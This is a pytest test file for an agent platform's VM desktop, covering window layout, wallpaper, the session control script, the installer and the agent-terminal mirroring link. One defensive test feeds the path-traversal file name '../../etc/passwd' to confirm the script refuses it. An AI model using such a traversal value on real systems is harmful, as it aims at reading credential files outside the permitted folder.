"""An environment's desktop (environments.toml desktop = true, browser = "vm"): the files the node sends with
the screen, the wallpaper an owner may replace, the browser as a window on it, the session the control
script starts (and the bare screen it falls back to), the installer and its versioned marker, the node's
link to the desktop's helper (the agent's terminal window, focus, DISPLAY) and the helper's transcript.

No X, no SSH and no machine here: the control script runs with its processes faked, the helper's
transcript code runs with stand-ins for python-xlib. tests/unit/test_environments_vmbrowser_docker.py runs
the real thing on a docker machine."""

from __future__ import annotations

import asyncio
import base64
import json
import re
import sys
import types
from pathlib import Path
from types import SimpleNamespace

import pytest
from test_environments_vmbrowser import FakeMachine, FakeService, FakeTunnel, _ctl_namespace, _env
from testkit.timing import until

from openajar.core.errors import EngineError
from openajar.core.models import LaneSpec
from openajar.env.models import ExecResult
from openajar.environments import desklink, tunnels, vmbrowser
from openajar.environments.models import EnvSettings

ROOT = Path(__file__).resolve().parents[2]
PKG = ROOT / "src" / "openajar" / "environments"
DESK = PKG / "desktop"
EM_DASH = "—"


# ------------------------------------------------------------------ the files and the look


def test_the_desktop_files_travel_with_the_screen_but_not_the_wallpaper():
    files = vmbrowser.desktop_files()
    for rel in ("desk.py", "openbox/rc.xml", "openbox/themerc", "openbox/close.xbm", "openbox/menu.xml",
                "icons/browser.svg", "icons/terminal.svg", "icons/files.svg", "icons/agent.svg", "icons/app.svg",
                "config/gtk-3.0/settings.ini", "config/lxterminal/lxterminal.conf"):
        assert rel in files, rel
    assert not any(r.startswith("wallpaper") or r.endswith((".pyc", ".png", ".jpg")) for r in files)
    rc = files["openbox/rc.xml"]
    for mark in ("AGENTOS_BROWSER_X", "AGENTOS_BROWSER_Y", "AGENTOS_AGENT_TERM_Y"):
        assert mark in rc  # the control script puts the browser's place in
    json.dumps(files)  # it travels to the machine as JSON


def test_what_a_person_reads_on_the_desktop_has_no_em_dash():
    for path in DESK.rglob("*"):
        if path.is_file() and path.suffix in (".xml", ".svg", ".ini", ".conf", ".css", ""):
            assert EM_DASH not in path.read_text(), path
    desk = (DESK / "desk.py").read_text()
    strings = re.findall(r'"([^"\n]*)"', desk)
    # the only em dash in the helper is the one it removes from the browser's title (written as an escape)
    assert not [s for s in strings if EM_DASH in s]


def test_the_browsers_close_button_minimizes_it_and_alt_f4_too():
    rc = (DESK / "openbox" / "rc.xml").read_text()
    close = rc[rc.index('<context name="Close">'):]
    close = close[:close.index("</context>")]
    assert "<class>*amoufox*</class>" in close and '<then><action name="Iconify"/>' in close
    assert '<else><action name="Close"/>' in close
    alt_f4 = rc[rc.index('<keybind key="A-F4">'):]
    assert '<then><action name="Iconify"/>' in alt_f4[:alt_f4.index("</keybind>")]


def test_the_default_wallpaper_is_ours_and_an_owner_can_replace_it(tmp_path):
    ours = vmbrowser.wallpaper(None)
    assert ours["kind"] == "image" and base64.b64decode(ours["data"])[:3] == b"\xff\xd8\xff"  # made ahead: a JPEG
    drawn = vmbrowser.wallpaper(None, (1280, 800))  # another size: the SVG, drawn on the machine
    assert drawn["kind"] == "svg" and b"openajar" in base64.b64decode(drawn["data"])
    assert vmbrowser.wallpaper(tmp_path) == ours  # a home without one: ours
    folder = tmp_path / "desktop"
    folder.mkdir()
    (folder / "wallpaper.png").write_bytes(b"\x89PNG own")
    assert vmbrowser.wallpaper(tmp_path) == {"kind": "image", "data": base64.b64encode(b"\x89PNG own").decode()}
    (folder / "wallpaper.svg").write_text("<svg/>")  # an SVG wins: it is drawn at the screen's size
    assert vmbrowser.wallpaper(tmp_path)["kind"] == "svg"


def test_a_wallpaper_too_large_keeps_ours(tmp_path, monkeypatch):
    monkeypatch.setattr(vmbrowser, "WALLPAPER_MAX", 4)
    (tmp_path / "desktop").mkdir()
    (tmp_path / "desktop" / "wallpaper.jpg").write_bytes(b"12345")
    assert vmbrowser.wallpaper(tmp_path) == vmbrowser.wallpaper(None)


# ------------------------------------------------------------------ the browser as a window


def test_on_the_desktop_the_browser_is_a_window_with_wallpaper_around_it_and_above_the_dock():
    spec = LaneSpec(id="env/e1234567890-browser")
    bare = vmbrowser.browser_options(spec)
    on = vmbrowser.browser_options(spec, desktop=True)
    assert bare["window"] == [1920, 1080] and not set(vmbrowser.DESKTOP_PREFS) & set(bare["firefox_user_prefs"])
    assert on["screen"] == [1920, 1080] and on["window"] == list(vmbrowser.DESKTOP_WINDOW)
    assert all(on["firefox_user_prefs"][k] == v for k, v in vmbrowser.DESKTOP_PREFS.items())
    # the prefs a page can read are the same with the desktop or without it
    assert {k: v for k, v in on["firefox_user_prefs"].items() if k not in vmbrowser.DESKTOP_PREFS} == \
        bare["firefox_user_prefs"]
    w, h = vmbrowser.DESKTOP_WINDOW
    ns = _ctl_namespace()
    x, y = (1920 - w) // 2, (1080 - h) // 2  # where Camoufox centres the window it reports
    sys.path.insert(0, str(DESK))
    try:
        import deskart
    finally:
        sys.path.remove(str(DESK))
    # GTK's edge round the browser's own title bar; the dock's band and the top bar, which the control script knows
    edge, band_top = ns["CSD_EDGE"], 1080 - deskart.BAND_H
    assert ns["TOP_BAR_H"] == deskart.TOP_H and y - edge >= deskart.TOP_H  # below the top bar
    assert x == vmbrowser.WINDOW_MARGIN and abs((y - edge) - (x - edge)) <= 24  # the wallpaper around it, about even
    assert y + h + edge <= band_top  # the dock stays clear
    assert vmbrowser.desktop_window((1280, 800)) == (1280 - 144, 800 - 144 - 46)
    assert on["firefox_user_prefs"]["browser.tabs.inTitlebar"] == 1 and on["firefox_user_prefs"]["ui.GtkCSDCloseButton"] == 0


# ------------------------------------------------------------------ the session on the machine


class FakeProc:
    def __init__(self, code=None):
        self.returncode = code

    def poll(self):
        return self.returncode


@pytest.fixture
def ctl(tmp_path, monkeypatch):
    """The control script with its folders in tmp_path and its processes faked."""
    ns = _ctl_namespace()
    run = tmp_path / "run"
    run.mkdir()
    ready = tmp_path / "desktop-ready"
    ready.write_text("1\n")
    ns.update(DIR=str(run), DESK=str(run / "desktop"), DESK_SOCK=str(run / "desk.sock"),
              DESK_READY=str(run / "desktop" / "desk.ready"), WALL_CACHE=str(tmp_path / "cache"),
              DESKTOP_READY=str(ready), SERVER_FILE=str(run / "screen.server"), SIZE_FILE=str(run / "screen.size"))
    spawned: list[list[str]] = []
    rendered: list[list[str]] = []

    def spawn(name, argv, env):
        spawned.append(argv)
        if name == "desk":
            Path(ns["DESK_READY"]).write_text("")
        return FakeProc()

    def fake_run(argv, **_kw):
        rendered.append(argv)
        Path(argv[argv.index("-o") + 1]).write_bytes(b"png")
        return SimpleNamespace(returncode=0, stdout=b"", stderr=b"")

    ns["_spawn"] = spawn
    ns["subprocess"] = SimpleNamespace(run=fake_run, DEVNULL=-3)
    monkeypatch.setattr("shutil.which", lambda t: f"/usr/bin/{t}")
    return SimpleNamespace(ns=ns, spawned=spawned, rendered=rendered, run=run, ready=ready)


def test_the_session_starts_openbox_and_the_helper_with_the_browsers_place(ctl):
    spec = vmbrowser.desktop_request(None)
    ctl.ns["_desktop"](spec, 1920, 1080)
    assert [a[0] for a in ctl.spawned] == ["openbox", "/usr/bin/python3"]
    assert ctl.spawned[0][1:] == ["--config-file", str(ctl.run / "desktop" / "openbox" / "rc.xml")]
    rc = (ctl.run / "desktop" / "openbox" / "rc.xml").read_text()
    w, h = vmbrowser.DESKTOP_WINDOW
    edge = ctl.ns["CSD_EDGE"]  # the browser draws its own title bar, with GTK's edge round it
    top = ctl.ns["TOP_BAR_H"]  # openbox counts from below the top bar
    # where the page works out its content from the claimed centred window (vmharden.every_launch): the window's
    # origin at the claim, and the edge lower, as the bottom edge counts in outerHeight (measured on the machine)
    assert f"<x>{(1920 - w) // 2}</x>" in rc and f"<y>{(1080 - h) // 2 + edge - top}</y>" in rc
    assert f"<y>{540 - top}</y>" in rc  # the agent's commands, from the middle of the screen down
    assert "OPENAJAR_" not in rc
    theme = ctl.run / "desktop" / "data" / "themes" / "openajar" / "openbox-3"
    assert (theme / "themerc").exists() and (theme / "close.xbm").exists()
    # the usual screen's wallpaper was made ahead: nothing is drawn on the machine
    assert (ctl.run / "desktop" / "wallpaper.png").read_bytes()[:3] == b"\xff\xd8\xff" and ctl.rendered == []


def test_the_wallpaper_is_rendered_once_for_a_size(ctl):
    spec = vmbrowser.desktop_request(None)
    spec["wallpaper"] = vmbrowser.wallpaper(None, (1280, 800))  # the SVG
    ctl.ns["_desktop"](spec, 1920, 1080)
    ctl.ns["_desktop"](spec, 1920, 1080)
    ctl.ns["_desktop"](spec, 1280, 800)
    sizes = [(a[a.index("-w") + 1], a[a.index("-h") + 1]) for a in ctl.rendered]
    assert sizes == [("1920", "1080"), ("1280", "800")]  # the second start used the kept one


def test_an_owners_png_wallpaper_is_used_as_it_is(ctl):
    spec = vmbrowser.desktop_request(None)
    spec["wallpaper"] = {"kind": "image", "data": base64.b64encode(b"own picture").decode()}
    ctl.ns["_desktop"](spec, 1920, 1080)
    assert ctl.rendered == [] and (ctl.run / "desktop" / "wallpaper.png").read_bytes() == b"own picture"


def test_a_machine_without_the_desktop_says_so(ctl):
    ctl.ready.unlink()
    with pytest.raises(RuntimeError, match="the desktop is not installed on this machine"):
        ctl.ns["_desktop"](vmbrowser.desktop_request(None), 1920, 1080)
    assert ctl.spawned == []


def test_a_desktop_file_outside_its_folder_is_refused(ctl):
    spec = vmbrowser.desktop_request(None)
    spec["files"]["../../etc/passwd"] = "x"
    with pytest.raises(RuntimeError, match="outside its folder"):
        ctl.ns["_desktop"](spec, 1920, 1080)


def test_a_desktop_that_fails_leaves_the_bare_screen_and_says_why(ctl, capsys):
    ns = ctl.ns
    stopped: list[str] = []
    ns["_screen"] = lambda req, w, h, env: "xvnc"
    ns["_stop"] = stopped.append
    ns["_write_xauthority"] = lambda path: None

    def broken(spec, w, h):
        raise RuntimeError("openbox exited (code 1)")

    ns["_desktop"] = broken
    ns["display"]({"width": 1920, "height": 1080, "desktop": {"files": {}}})
    out = json.loads(capsys.readouterr().out.strip().splitlines()[-1])
    assert out["ok"] is True and out["desktop"] is False and "openbox exited" in out["desktop_error"]
    assert out["server"] == "xvnc" and {"desk", "openbox"} <= set(stopped)


def _running_screen(ctl, *, gone=(), size="1920x1080", server="xvnc", serving=True):
    """The control script's view of a screen that runs at `size`, with the processes in `gone` dead."""
    ns = ctl.ns
    stopped: list[str] = []
    ns["_stop"] = stopped.append
    ns["_wait"] = lambda proc, name, ready, wait_s: None
    ns["_running"] = lambda name: None if name in gone else 4242
    ns["_unix_listening"] = lambda path: serving
    ns["X_SOCKET"] = str(ctl.run / "X99")
    Path(ns["X_SOCKET"]).write_text("")
    Path(ns["SIZE_FILE"]).write_text(size)
    Path(ns["SERVER_FILE"]).write_text(server)
    return stopped


def _answer(capsys):
    return json.loads(capsys.readouterr().out.strip().splitlines()[-1])


def test_a_screen_kept_at_its_size_stays_with_its_windows(ctl, capsys):
    ns = ctl.ns
    stopped = _running_screen(ctl)
    ns["display"]({"width": 1920, "height": 1080, "keep": True, "desktop": {"files": {}}})
    out = _answer(capsys)
    assert out["kept"] is True and out["desktop"] is True and out["mended"] == []
    assert stopped == [] and ctl.spawned == []
    assert ns["_mend"]({"keep": True}, 1280, 800) is None  # another size starts afresh
    assert ns["_mend"]({"width": 1920}, 1920, 1080) is None  # and so does a call without keep


def test_a_kept_screen_whose_desktop_died_gets_it_again_and_keeps_its_browser(ctl, capsys):
    ns = ctl.ns
    stopped = _running_screen(ctl, gone=("desk",))  # the helper died; openbox is still there
    ns["display"]({"width": 1920, "height": 1080, "keep": True, "desktop": vmbrowser.desktop_request(None)})
    out = _answer(capsys)
    assert out["kept"] is True and out["desktop"] is True and out["mended"] == ["desktop"]
    assert set(stopped) == {"desk", "openbox"}  # what was left of the session, never the browser or the screen
    assert [a[0] for a in ctl.spawned] == ["openbox", "/usr/bin/python3"]


def test_an_x11vnc_that_died_starts_again_on_its_running_screen(ctl, capsys):
    ns = ctl.ns
    stopped = _running_screen(ctl, server="x11vnc", serving=False)
    ns["display"]({"width": 1920, "height": 1080, "keep": True})
    out = _answer(capsys)
    assert out["kept"] is True and out["mended"] == ["x11vnc"] and stopped == ["x11vnc"]
    assert [a[0] for a in ctl.spawned] == ["x11vnc"]
    assert ns["_mend"]({"keep": True}, 1920, 1080) is not None
    _running_screen(ctl, server="xvnc", serving=False)  # an Xvnc that does not serve is the screen itself
    assert ns["_mend"]({"keep": True}, 1920, 1080) is None


def test_only_keep_never_starts_a_screen_afresh(ctl, capsys):
    ns = ctl.ns
    stopped = _running_screen(ctl, gone=("xvfb",))  # the screen is gone
    ns["display"]({"width": 1920, "height": 1080, "keep": True, "only_keep": True, "desktop": {"files": {}}})
    out = _answer(capsys)
    assert out["ok"] is True and out["untouched"] is True and out["kept"] is False
    assert stopped == [] and ctl.spawned == []  # the browser and everything else as they were


def test_a_browser_started_on_the_bare_screen_is_framed_maximized_when_the_desktop_comes(ctl):
    spec = vmbrowser.desktop_request(None, browser_fills=True)
    assert spec["window"] == [1920, 1080] and spec["own_titlebar"] is False
    ctl.ns["_desktop"](spec, 1920, 1080)
    rc = (ctl.run / "desktop" / "openbox" / "rc.xml").read_text()
    assert "<maximized>yes</maximized>" in rc
    ctl.ns["_desktop"](vmbrowser.desktop_request(None), 1920, 1080)
    rc = (ctl.run / "desktop" / "openbox" / "rc.xml").read_text()
    assert "<maximized>no</maximized>" in rc and "<maximized>yes</maximized>" not in rc


def test_the_desktops_apps_are_light_and_the_x11vnc_fallback_is_quick(ctl):
    env = ctl.ns["_desktop_env"]()
    assert env["GTK_THEME"] == "Adwaita" and "GTK_THEME" not in ctl.ns["_base_env"]()  # never the browser's
    ns = ctl.ns
    ns["_wait"] = lambda proc, name, ready, wait_s: None
    ns["_screen"]({"server": "x11vnc"}, 1920, 1080, {})
    argv = ctl.spawned[-1]
    assert argv[argv.index("-defer") + 1] == "5" and argv[argv.index("-wait") + 1] == "5" and "-nowf" in argv


def test_on_the_desktop_the_browser_draws_its_own_title_bar_in_its_own_look(ctl, monkeypatch, capsys):
    ns = ctl.ns
    envs: list[dict] = []
    ns["_running"] = lambda name: 4242 if name == "xvfb" else None  # the screen runs, no browser yet
    ns["_wait"] = lambda proc, name, ready, wait_s: None
    ns["_spawn"] = lambda name, argv, env: envs.append(env) or FakeProc()
    monkeypatch.setenv("GTK_THEME", "Adwaita:dark")  # the agent's commands carry it, and this script is one
    ns["browser"]({"port": 1, "ws_path": "/x", "options": {}, "own_titlebar": True})
    ns["browser"]({"port": 1, "ws_path": "/x", "options": {}})
    assert envs[0]["MOZ_GTK_TITLEBAR_DECORATION"] == "client" and "MOZ_GTK_TITLEBAR_DECORATION" not in envs[1]
    assert all("GTK_THEME" not in e for e in envs)  # the browser's look is GTK's default, as a page sees it


def test_the_screen_is_xvnc_on_its_socket_with_no_tcp_listener(ctl):
    ns = ctl.ns
    ns["_wait"] = lambda proc, name, ready, wait_s: None
    assert ns["_screen"]({}, 1920, 1080, {}) == "xvnc"
    argv = ctl.spawned[-1]
    assert argv[0] == "Xvnc" and argv[argv.index("-rfbport") + 1] == "-1"  # no TCP port at all
    assert argv[argv.index("-rfbunixpath") + 1] == ns["VNC_SOCK"] and argv[argv.index("-rfbunixmode") + 1] == "0600"
    assert argv[argv.index("-SecurityTypes") + 1] == "None" and argv[argv.index("-auth") + 1] == ns["XAUTH"]
    assert "-nolisten" in argv and argv[argv.index("-nolisten") + 1] == "tcp"
    assert "-AcceptSetDesktopSize=0" in argv  # the screen's size is the browser's pinned one
    assert ns["_screen"]({"server": "x11vnc"}, 1920, 1080, {}) == "x11vnc"
    assert [a[0] for a in ctl.spawned[-2:]] == ["Xvfb", "x11vnc"]


# ------------------------------------------------------------------ the installer


def test_a_late_install_on_a_running_machine_keeps_the_package_lists():
    """The node installs the desktop on a machine the agent already uses: its apt-get must still find packages."""
    script = vmbrowser.desktop_install_script()
    assert 'if [ -z "${AGENTOS_DESKTOP_LIVE:-}" ]; then\n  rm -rf /var/lib/apt/lists/*' in script
    assert "AGENTOS_DESKTOP_LIVE=1 sh -s" in (PKG / "vmbrowser.py").read_text()


def test_the_installer_has_a_versioned_marker_and_only_archive_packages():
    script = (PKG / "desktop.sh").read_text()
    assert f"VERSION={vmbrowser.DESKTOP_VERSION}\n" in script
    assert 'head -n 1 "$READY")" = "$VERSION"' in script  # an older marker installs again
    assert "apt-get install -y -q --no-install-recommends openbox lxterminal pcmanfm" in script
    assert "tigervnc-standalone-server" in script and "curl" not in script and "pip" not in script
    s = vmbrowser.desktop_install_script()
    assert "<<'OPENAJAR_DESKTOP_SCRIPT'\n" in s and s.rstrip().endswith(f"sh {vmbrowser.DESKTOP_SCRIPT_ON_VM}")
    assert "OPENAJAR_DESKTOP_SCRIPT" not in script


def test_the_image_and_the_snapshot_carry_the_desktop():
    from openajar.environments.machine import dev_image_script

    docker = (ROOT / "deploy" / "environments" / "Dockerfile").read_text()
    assert "COPY desktop.sh /usr/local/lib/agentos-env/" in docker
    assert docker.index("sh /usr/local/lib/agentos-env/browser.sh") < \
        docker.index("RUN sh /usr/local/lib/agentos-env/desktop.sh")
    assert f'LABEL org.agentos.desktop="{vmbrowser.DESKTOP_VERSION}"' in docker
    assert '"desktop.sh"' in (PKG / "cli.py").read_text()
    # the release's image is built from the same folder (.github/workflows/env-image.yml)
    assert "src/openajar/environments/desktop.sh" in (ROOT / ".github" / "workflows" / "env-image.yml").read_text()
    full = dev_image_script()
    assert "OPENAJAR_DESKTOP_SCRIPT" in full and full.index("browser.sh") < full.index("desktop.sh")


class DesktopMachine(FakeMachine):
    """A machine whose desktop marker says `version`, whose display action answers `display` and whose status
    action answers `status`."""

    def __init__(self, version: str = "1", display: dict | None = None, status: dict | None = None, **kw):
        super().__init__(**kw)
        self.version, self.display = version, display or {"ok": True, "desktop": True, "server": "xvnc"}
        self.status = status or {"ok": True, "display": True, "desktop": True, "browser": False}
        self.installed_desktop = 0

    async def exec(self, lane_id, cmd, *, timeout_s=None, stdin=None, **kw):
        if cmd.startswith("head -n 1 "):
            self.ran.append(cmd)
            return ExecResult(exit_code=0, stdout=self.version + "\n", stderr="", duration_s=0.01)
        if cmd == "AGENTOS_DESKTOP_LIVE=1 sh -s" and stdin == vmbrowser.desktop_install_script():
            self.ran.append("desktop.sh")
            self.installed_desktop += 1
            self.version = str(vmbrowser.DESKTOP_VERSION)
            return ExecResult(exit_code=0, stdout="", stderr="", duration_s=0.01)
        if cmd == vmbrowser.ctl_command() and json.loads(stdin)["action"] == "display":
            req = json.loads(stdin)
            req.pop("script")
            self.asked.append(req)
            out = self.display if "desktop" in req else {"ok": True, "desktop": False}
            return ExecResult(exit_code=0, stdout=json.dumps(out) + "\n", stderr="", duration_s=0.01)
        if cmd == vmbrowser.ctl_command() and json.loads(stdin)["action"] == "status":
            self.asked.append({"action": "status"})
            return ExecResult(exit_code=0, stdout=json.dumps(self.status) + "\n", stderr="", duration_s=0.01)
        return await super().exec(lane_id, cmd, timeout_s=timeout_s, stdin=stdin, **kw)


def _vm(tmp_path, machine, settings=None):
    svc = FakeService({"e1234567890": _env("e1234567890")}, FakeTunnel(str(tmp_path)), machine)
    svc.settings = settings or EnvSettings(browser="vm")
    svc.home = tmp_path
    return svc, vmbrowser.VmBrowsers(svc)


async def test_an_older_machine_gets_the_desktop_in_the_background(tmp_path):
    machine = DesktopMachine(version="0")
    svc, vm = _vm(tmp_path, machine)
    env = svc.by_id["e1234567890"]
    await vm.ensure_installed(env)
    await asyncio.gather(*vm._installing.values())
    assert machine.installed_desktop == 1
    await vm.ensure_installed(env)  # now at the version: nothing more
    await asyncio.gather(*vm._installing.values())
    assert machine.installed_desktop == 1


async def test_with_the_desktop_off_nothing_of_it_is_installed_or_sent(tmp_path):
    machine = DesktopMachine(version="0")
    svc, vm = _vm(tmp_path, machine, EnvSettings(browser="vm", desktop=False))
    await vm.ensure_installed(svc.by_id["e1234567890"])
    assert vm._installing == {} and machine.installed_desktop == 0
    await vm.acquire("env/e1234567890-browser")
    assert "desktop" not in machine.asked[0] and vm.desktops["env/e1234567890-browser"] is False


async def test_the_screen_starts_with_the_desktop_and_the_browser_follows_it(tmp_path):
    machine = DesktopMachine()
    _svc, vm = _vm(tmp_path, machine)
    await vm.acquire("env/e1234567890-browser")
    [req] = machine.asked
    assert set(req["desktop"]) == {"files", "wallpaper", "window", "title", "own_titlebar"}
    assert req["desktop"]["window"] == list(vmbrowser.DESKTOP_WINDOW)
    assert req["keep"] is True and req["desktop"]["title"] == "t"  # the greeting on the wallpaper names it
    assert vm.desktops["env/e1234567890-browser"] is True


async def test_the_screen_is_the_environments_and_outlives_its_browser(tmp_path):
    machine = DesktopMachine()
    svc, vm = _vm(tmp_path, machine)
    env, lane = svc.by_id["e1234567890"], "env/e1234567890-browser"
    assert vm.screen(lane) is None
    vm.screen_soon(env)  # when the environment is ready: in the background
    await asyncio.gather(*vm._screen_tasks.values())
    assert [r["action"] for r in machine.asked] == ["display"] and machine.asked[0]["keep"] is True
    screen = vm.screen(lane)
    assert screen is not None and screen.vnc_socket == svc.tunnel.vnc_path and (screen.width, screen.height) == (1920, 1080)
    vm.screen_soon(env)  # once is enough
    assert vm._screen_tasks == {}
    await vm.acquire(lane)  # the browser opens on the screen that runs (the machine keeps it: keep)
    await vm.release(lane)  # the lane goes cold: only the browser stops
    assert machine.asked[-1] == {"action": "stop", "what": ["browser"]}
    assert vm.screen(lane) is not None and vm.desktops[lane] is True
    svc.tunnel.alive = False
    assert vm.screen(lane) is None  # no way to the machine, no live view
    svc.tunnel.alive = True
    await vm.drop_screen(env)  # the environment closes
    assert machine.asked[-1] == {"action": "stop", "what": ["browser", "display"]}
    assert vm.screen(lane) is None and lane not in vm.desktops


async def test_the_desktop_installed_late_comes_under_the_running_browser_without_restarting_it(tmp_path):
    machine = DesktopMachine(display={"ok": True, "desktop": False, "desktop_error": "not installed yet"})
    svc, vm = _vm(tmp_path, machine)
    env, lane = svc.by_id["e1234567890"], "env/e1234567890-browser"
    await vm.acquire(lane)  # the browser came first, on the bare screen (the desktop was still installing)
    assert vm.desktops[lane] is False and vm.screen(lane) is None
    machine.display = {"ok": True, "desktop": True, "server": "xvnc", "kept": True, "mended": ["desktop"]}
    vm.screen_soon(env)  # the install is done: the screen's turn
    await asyncio.gather(*vm._screen_tasks.values())
    req = machine.asked[-1]
    assert req["action"] == "display" and req["only_keep"] is True and req["keep"] is True  # never afresh
    assert req["desktop"]["window"] == [1920, 1080] and req["desktop"]["own_titlebar"] is False  # framed maximized
    assert vm.desktops[lane] is True and vm.screen(lane) is not None  # the next browser opens as a window on it
    machine.display = {"ok": True, "kept": False, "untouched": True}  # a screen that is gone stays as it was
    vm._screens.clear()
    vm.screen_soon(env)
    await asyncio.gather(*vm._screen_tasks.values())
    assert vm.desktops[lane] is True and vm._screens == {}


async def test_the_regular_check_starts_a_screen_that_died_again(tmp_path, caplog):
    machine = DesktopMachine()
    svc, vm = _vm(tmp_path, machine)
    env, lane = svc.by_id["e1234567890"], "env/e1234567890-browser"
    vm.check_screen(env)  # no desktop up: nothing asked
    assert vm._screen_tasks == {} and machine.asked == []
    vm.screen_soon(env)
    await asyncio.gather(*vm._screen_tasks.values())
    vm.check_screen(env)  # a healthy screen: asked, and left alone
    await asyncio.gather(*vm._screen_tasks.values())
    assert [r["action"] for r in machine.asked] == ["display", "status"]
    machine.status = {"ok": True, "display": False, "desktop": False, "browser": False}  # Xvnc died, lane cold
    with caplog.at_level("WARNING", logger="openajar.environments"):
        vm.check_screen(env)
        await asyncio.gather(*vm._screen_tasks.values())
    assert machine.asked[-1]["action"] == "display" and "only_keep" not in machine.asked[-1]
    assert "its screen stopped on its machine; starting it again" in caplog.text
    await vm.acquire(lane)  # the browser runs on it; then the helper dies under it
    machine.status = {"ok": True, "display": True, "desktop": False, "browser": True}
    vm.check_screen(env)
    await asyncio.gather(*vm._screen_tasks.values())
    req = machine.asked[-1]
    assert req["only_keep"] is True and req["desktop"]["own_titlebar"] is True  # mended under it, never afresh
    async with vm._screen_locks[env.id]:  # a screen being started is never checked at the same time
        vm.check_screen(env)
        assert vm._screen_tasks == {}
    vm.launching[lane] = object()  # nor while the browser launches
    vm.check_screen(env)
    assert vm._screen_tasks == {}


async def test_with_the_desktop_off_the_screen_goes_with_the_browser(tmp_path):
    machine = DesktopMachine()
    svc, vm = _vm(tmp_path, machine, EnvSettings(browser="vm", desktop=False))
    vm.screen_soon(svc.by_id["e1234567890"])
    assert vm._screen_tasks == {}
    await vm.acquire("env/e1234567890-browser")
    assert "keep" not in machine.asked[0]
    await vm.release("env/e1234567890-browser")
    assert machine.asked[-1] == {"action": "stop", "what": ["browser", "display"]}
    assert vm.screen("env/e1234567890-browser") is None


async def test_a_desktop_that_does_not_start_leaves_the_browser_filling_the_screen(tmp_path, caplog):
    machine = DesktopMachine(display={"ok": True, "desktop": False, "desktop_error": "no openbox"})
    _svc, vm = _vm(tmp_path, machine)
    with caplog.at_level("WARNING", logger="openajar.environments"):
        await vm.acquire("env/e1234567890-browser")
    assert vm.desktops["env/e1234567890-browser"] is False
    assert "the desktop did not start" in caplog.text and "no openbox" in caplog.text


# ------------------------------------------------------------------ the node's link to the helper


class FakeLink:
    def __init__(self):
        self.sent: list[dict] = []
        self.path = "/x/desk"

    def send(self, msg):
        self.sent.append(msg)


def test_the_tap_shows_the_output_as_read_and_stops_at_its_limit(monkeypatch):
    monkeypatch.setattr(desklink, "MIRROR_BYTES", 10)
    link = FakeLink()
    tap = desklink.Tap(link, "npm test", "/work/shop", True)
    tap.feed("o", "hé".encode()[:2])  # a character split across two reads
    tap.feed("o", "hé".encode()[2:] + b"llo")
    tap.feed("e", b"oops! and more")
    tap.end(ExecResult(exit_code=1, stdout="", stderr="", duration_s=0.5))
    begin, *outs, end = link.sent
    assert begin == {"t": "begin", "id": tap.id, "cmd": "npm test", "cwd": "/work/shop", "show": True}
    assert "".join(o["d"] for o in outs if o["s"] == "o") == "héllo"
    assert [o["d"] for o in outs if o["s"] == "e"] == ["oops"]  # 10 bytes in all
    assert end["exit"] == 1 and end["dropped"] == 10 and end["dur"] == 0.5 and end["timeout"] is False


def test_a_stopped_command_says_so():
    link = FakeLink()
    tap = desklink.Tap(link, "sleep 100", None, False)
    tap.end(None, cancelled=True)
    assert link.sent[-1]["cancelled"] is True and link.sent[-1]["exit"] is None


class LinkService(FakeService):
    def __init__(self, tmp_path, control="agent"):
        super().__init__({"e1234567890": _env("e1234567890")}, FakeTunnel(str(tmp_path)), FakeMachine())
        self.tunnel.desk_path = str(tmp_path / "desk")
        self.control = control

    def _get(self, name):
        state = SimpleNamespace(value=self.control)
        return SimpleNamespace(control=lambda lane: SimpleNamespace(state=state)) if name == "lanes" else None


def _links(tmp_path, control="agent", desktop=True):
    svc = LinkService(tmp_path, control)
    vm = SimpleNamespace(desktops={"env/e1234567890-browser": desktop})
    links = desklink.DeskLinks(svc, vm)
    link = FakeLink()
    links._links["e1234567890"] = link
    link.path = svc.tunnel.desk_path
    return links, link


def test_a_command_shows_only_on_a_machine_whose_screen_runs_the_desktop(tmp_path):
    links, link = _links(tmp_path, desktop=False)
    assert links.mirror("env/e1234567890", "ls", None) is None and links.screen_env("env/e1234567890") == {}
    links, link = _links(tmp_path)
    assert links.mirror("env/e1234567890-browser", "ls", None) is None  # the browser lane runs no commands
    tap = links.mirror("env/e1234567890", "ls", "/work")
    assert tap is not None and link.sent[0]["show"] is True
    assert links.screen_env("env/e1234567890") == {"DISPLAY": ":99", "XAUTHORITY": "/run/agentos-browser/xauth",
                                                   "GTK_THEME": "Adwaita"}  # its windows light like the desktop's
    assert links.mirror("personal/x", "ls", None) is None


@pytest.mark.parametrize("control", ["human", "paused"])
def test_while_a_person_has_the_screen_a_command_does_not_get_it(tmp_path, control):
    links, _link = _links(tmp_path, control=control)
    assert links.screen_env("env/e1234567890") == {}  # no DISPLAY, no cookie


def test_the_browser_comes_forward_once_and_never_under_a_persons_hands(tmp_path):
    links, link = _links(tmp_path)
    links.before_call("browser_navigate", "env/e1234567890-browser")
    links.before_call("browser_snapshot", "env/e1234567890-browser")  # the same window, just asked for
    links.before_call("terminal_exec", "env/e1234567890")  # not a browser tool
    assert [m for m in link.sent if m["t"] == "focus"] == [{"t": "focus", "what": "browser"}]
    links.mirror("env/e1234567890", "ls", None)  # the agent's terminal comes forward with its command
    links.before_call("browser_act", "env/e1234567890-browser")
    assert [m.get("what") for m in link.sent if m["t"] == "focus"] == ["browser", "browser"]
    held, held_link = _links(tmp_path, control="human")
    held.before_call("browser_navigate", "env/e1234567890-browser")
    tap = held.mirror("env/e1234567890", "ls", None)
    assert [m["t"] for m in held_link.sent if m["t"] != "status"] == ["begin"]
    assert next(m for m in held_link.sent if m["t"] == "begin")["show"] is False
    assert tap is not None  # the command still shows in its window, which does not jump forward


def test_the_top_bar_hears_what_the_agent_does_once_per_change(tmp_path, monkeypatch):
    links, link = _links(tmp_path)
    links.svc.by_id["e1234567890"].agent = "claude-code"
    links.before_call("browser_navigate", "env/e1234567890-browser")
    links.before_call("browser_snapshot", "env/e1234567890-browser")  # the same: said once
    links.before_call("terminal_exec", "env/e1234567890")
    links.before_call("file_edit", "env/e1234567890")
    said = [m for m in link.sent if m["t"] == "status"]
    assert [m["doing"] for m in said] == ["browser", "terminal", "editing"]
    assert {m["agent"] for m in said} == {"Claude Code"} and {m["control"] for m in said} == {"agent"}
    assert all(isinstance(m["tz"], int) for m in said)
    monkeypatch.setattr(desklink, "STATUS_AGAIN_S", 0.0)
    links.before_call("file_edit", "env/e1234567890")  # the same again, later: said again
    assert len([m for m in link.sent if m["t"] == "status"]) == 4
    links.svc.control = "human"
    links._control_changed("env/e1234567890-browser", None, None)  # a take over
    assert link.sent[-1]["control"] == "human" and link.sent[-1]["doing"] == ""


